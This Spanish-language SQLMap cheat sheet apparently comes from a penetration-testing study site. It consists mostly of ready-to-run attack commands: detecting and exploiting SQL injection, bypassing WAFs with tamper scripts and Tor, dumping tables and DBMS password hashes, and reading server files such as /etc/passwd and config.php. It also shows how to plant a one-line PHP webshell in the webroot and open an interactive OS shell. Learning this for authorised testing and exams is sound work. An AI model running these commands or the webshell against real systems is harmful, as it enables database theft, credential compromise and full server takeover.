---
title: "SQLMap Essentials"
description: "Automatización, tamper scripts, --os-shell y --dump con SQLMap."
sidebar:
  order: 4
  label: "SQLMap Essentials"
---
> SQLMap automatiza la detección y explotación de SQLi: desde fingerprint hasta dump completo, lectura/escritura de archivos y shell OS. La navaja suiza del SQLi.

---


## Formas de especificar la petición

```bash
# URL con parámetro GET
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# Petición completa desde archivo (guardada desde Burp)
sqlmap -r req.txt --batch

# POST con data inline
sqlmap -u "http://target/search.php" --data='uid=1&name=test' --batch

# Marcar parámetro inyectable con * (útil en POST)
sqlmap -u "http://target/search.php" --data='uid=1*&name=test' --batch

# Cookie
sqlmap -u "http://target/" --cookie='PHPSESSID=abc123; security=low' --batch

# Header custom
sqlmap -u "http://target/" -H 'X-Forwarded-For: 1.2.3.4' --batch

# User-Agent aleatorio
sqlmap -u "http://target/?id=1" --random-agent --batch

# Emular dispositivo móvil
sqlmap -u "http://target/?id=1" --mobile --batch

# Método HTTP no estándar
sqlmap -u "http://target/?id=1" --method PUT --batch
```

---

## Tipos de inyección (técnicas)

| Código | Tipo | Descripción |
|--------|------|-------------|
| `B` | Boolean-based blind | Inferir datos por respuesta T/F |
| `E` | Error-based | Extraer datos de mensajes de error |
| `U` | UNION-based | Inyección con UNION SELECT |
| `S` | Stacked queries | Queries encadenadas con `;` |
| `T` | Time-based blind | Inferir datos con SLEEP() |
| `Q` | Inline queries | Subquery en la consulta original |

```bash
# Forzar técnica específica (más rápido)
sqlmap -u "http://target/?id=1" --technique=BEU --batch

# Solo time-based (cuando no hay output visible)
sqlmap -u "http://target/?id=1" --technique=T --batch
```

---

## Tuning del ataque

```bash
# Prefijo/sufijo para inyecciones con contexto complejo
sqlmap -u "http://target/?id=1" --prefix='%')'  --suffix='-- -' --batch

# Nivel de tests (1-5, default=1) — más nivel = más vectores
sqlmap -u "http://target/?id=1" --level=5 --batch

# Riesgo de queries (1-3, default=1) — 3 incluye UPDATE/DELETE
sqlmap -u "http://target/?id=1" --risk=3 --batch

# UNION tuning
sqlmap -u "http://target/?id=1" --union-cols=17 --batch      # forzar nº de columnas
sqlmap -u "http://target/?id=1" --union-char='a' --batch     # char de relleno
sqlmap -u "http://target/?id=1" --union-from=users --batch   # tabla FROM en el UNION

# Debug / troubleshooting
sqlmap -u "http://target/?id=1" --parse-errors --batch       # mostrar errores SQL en output
sqlmap -u "http://target/?id=1" -v 6 --batch                 # verbosidad máxima (0-6)
sqlmap -u "http://target/?id=1" -t /tmp/traffic.txt --batch  # guardar tráfico
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080" --batch  # ver en Burp
```

---

## Enumeración de la base de datos

```bash
# Fingerprint rápido
sqlmap -u "http://target/?id=1" --banner --current-user --current-db --is-dba --batch

# Listar todas las bases de datos
sqlmap -u "http://target/?id=1" --dbs --batch

# Listar tablas de una DB
sqlmap -u "http://target/?id=1" --tables -D testdb --batch

# Listar columnas de una tabla
sqlmap -u "http://target/?id=1" --columns -T users -D testdb --batch

# Dump completo de una tabla
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --batch

# Dump de columnas específicas
sqlmap -u "http://target/?id=1" --dump -T users -D testdb -C username,password --batch

# Dump parcial (filas 2 a 3)
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --start=2 --stop=3 --batch

# Dump con filtro WHERE
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --where="name LIKE 'admin%'" --batch

# Dump todas las DBs (excluye system DBs)
sqlmap -u "http://target/?id=1" --dump-all --exclude-sysdbs --batch

# Schema completo de la DB
sqlmap -u "http://target/?id=1" --schema --batch

# Buscar tabla por nombre
sqlmap -u "http://target/?id=1" --search -T user --batch

# Buscar columna por nombre (e.g., columnas con "pass")
sqlmap -u "http://target/?id=1" --search -C pass --batch

# Dump de hashes de contraseñas del DBMS
sqlmap -u "http://target/?id=1" --passwords --batch
```

---

## Bypass de WAF / Protecciones

```bash
# CSRF token — especificar el nombre del campo token
sqlmap -u "http://target/" --data="token=abc&uid=1" --csrf-token="token" --batch

# Randomizar parámetro por petición (anti-caché)
sqlmap -u "http://target/?id=1&rnd=abc" --randomize=rnd --batch

# Evaluación Python para tokens dinámicos
sqlmap -u "http://target/?id=1" --eval="import hashlib; hash=hashlib.md5(b'1').hexdigest()" --batch

# Tor + check de conectividad
sqlmap -u "http://target/?id=1" --tor --check-tor --batch

# Saltar detección automática de WAF
sqlmap -u "http://target/?id=1" --skip-waf --batch

# Chunked transfer encoding (bypass de WAF body inspection)
sqlmap -u "http://target/?id=1" --chunked --batch

# Combinar múltiples tamper scripts
sqlmap -u "http://target/?id=1" --tamper=between,randomcase --batch
sqlmap -u "http://target/?id=1" --tamper=space2comment,versionedkeywords --batch

# User-Agent de navegador real
sqlmap -u "http://target/?id=1" --random-agent --batch

# Listar todos los tamper scripts disponibles
sqlmap --list-tampers
```

### Tamper scripts más útiles

| Tamper | Efecto | Cuándo usar |
|--------|--------|-------------|
| `between` | `AND` → `BETWEEN 0 AND 1` | Filtros básicos de WAF |
| `randomcase` | `SELECT` → `SeLeCt` | Filtros case-sensitive |
| `space2comment` | espacio → `/**/` | Filtros de espacios |
| `space2plus` | espacio → `+` | Filtros de espacios en URL |
| `base64encode` | encodeBase64(payload) | Encoding de payload completo |
| `percentage` | `S` → `%53` | WAFs que descodifican parcialmente |
| `versionedkeywords` | `UNION` → `/*!UNION*/` | MySQL WAFs que filtran keywords |
| `modsecurityversioned` | combina comentarios versionados | ModSecurity |

---

## Explotación OS — Lectura y escritura de archivos

```bash
# Verificar si somos DBA
sqlmap -u "http://target/?id=1" --is-dba --batch

# Leer archivo del servidor
sqlmap -u "http://target/?id=1" --file-read "/etc/passwd" --batch
sqlmap -u "http://target/?id=1" --file-read "/var/www/html/config.php" --batch

# Escribir webshell en el servidor
# Crear shell.php local primero:
# <?php system($_REQUEST[0]); ?>
sqlmap -u "http://target/?id=1" \
  --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php" \
  --batch

# Verificar: http://target/shell.php?0=id
```

---

## OS Shell interactivo

```bash
# Shell OS interactivo (requiere: DBA + FILE priv + webroot escribible)
sqlmap -u "http://target/?id=1" --os-shell --batch

# Si pregunta por webroot, especificar manualmente:
# /var/www/html/ (Apache Linux)
# C:/xampp/htdocs/ (Windows XAMPP)
# /usr/share/nginx/html/ (Nginx Linux)

# SQLMap escribe un stager PHP + UDF → interfaz shell interactiva
# Equivalente a una webshell, pero gestionada por sqlmap
```

---

## Flags clave — Referencia rápida

| Flag | Descripción |
|------|-------------|
| `-u URL` | Target URL |
| `-r FILE` | Petición HTTP desde archivo |
| `--data` | Data POST |
| `--batch` | No preguntar al usuario (modo automático) |
| `--cookie` | Enviar cookie personalizada |
| `-H` | Header adicional |
| `--random-agent` | User-Agent aleatorio |
| `--level` | Nivel de tests (1-5) |
| `--risk` | Riesgo de payload (1-3) |
| `--technique` | Técnicas: BEUSTQ |
| `--prefix/--suffix` | Ajuste fino de inyección |
| `--tamper` | Script(s) de ofuscación |
| `--proxy` | Proxy para ver tráfico en Burp |
| `--tor` | Usar red Tor |
| `--dbs` | Listar bases de datos |
| `--tables -D db` | Listar tablas |
| `--dump -T tabla -D db` | Dump de tabla |
| `--dump-all --exclude-sysdbs` | Dump completo sin system DBs |
| `--passwords` | Hashes de passwords del DBMS |
| `--is-dba` | Verificar privilegios DBA |
| `--file-read` | Leer archivo del servidor |
| `--file-write + --file-dest` | Escribir archivo en el servidor |
| `--os-shell` | Shell OS interactivo |
| `--csrf-token` | Nombre del campo CSRF |
| `--skip-waf` | Saltar detección de WAF |
| `--parse-errors` | Mostrar errores SQL en output |
| `-v 6` | Verbosidad máxima |
| `--list-tampers` | Listar scripts tamper disponibles |

---

## Pitfalls / Gotchas

- **`--batch` siempre** → sin `--batch`, sqlmap para y pregunta en cada decisión. En un examen, usar siempre `--batch`.
- **`-r req.txt` desde Burp** → la petición debe estar en texto plano (Copy as `Raw`). Si tiene codificación especial, puede fallar la detección.
- **`--level 1 --risk 1` (default)** → puede no detectar inyecciones complejas. Si nada sale con defaults, subir a `--level=5 --risk=3`.
- **UNION column mismatch** → si la app lanza error de columnas, usar `--union-cols` para forzar el número correcto.
- **`--os-shell` sin DBA** → fallará. Verificar `--is-dba` antes de intentarlo.
- **`--file-write` sin webroot** → el archivo se escribe pero no es accesible via HTTP. Leer la configuración del servidor primero para encontrar el webroot real.
- **`secure_file_priv` no vacío** → `--file-read` y `--file-write` fallarán aunque tengamos FILE privilege. MySQL moderno lo restringe por defecto.
- **WAF sin tamper** → si la DB devuelve resultados extraños o errores inesperados, añadir `--tamper=between,randomcase` como punto de partida.
- **`--tor` lento** → los scans por Tor son muy lentos. Solo para evasión real; en laboratorio usar `--proxy` hacia Burp.
- **Charset en `--union-char`** → por defecto usa `NULL`. Si la app filtra NULL, cambiar a un char: `--union-char='a'`.
- **`--dump` hashea automáticamente** → si encuentra hashes en campos `password`, sqlmap ofrece crackearlos con diccionario. Responder sí o pasar `--batch` (auto-sí).
- **`--search -C pass`** → busca columnas que contengan "pass" en su nombre en toda la DB. Muy útil para encontrar tablas de credenciales sin conocer el schema.

---

## Cheatsheets relacionados

- [SQL Injection Fundamentals](/metodologias/web/sql-injection-fundamentals/) — SQLi manual antes de automatizar con sqlmap
- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar peticiones para guardarlas en req.txt
- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — webshells alternativas post-explotación SQLi
- [File Transfers](/metodologias/privesc/file-transfers/) — exfiltrar datos del servidor tras comprometer vía SQLi
- [Password Attacks](/metodologias/exploitation/password-attacks/) — crackear hashes extraídos con --passwords o --dump
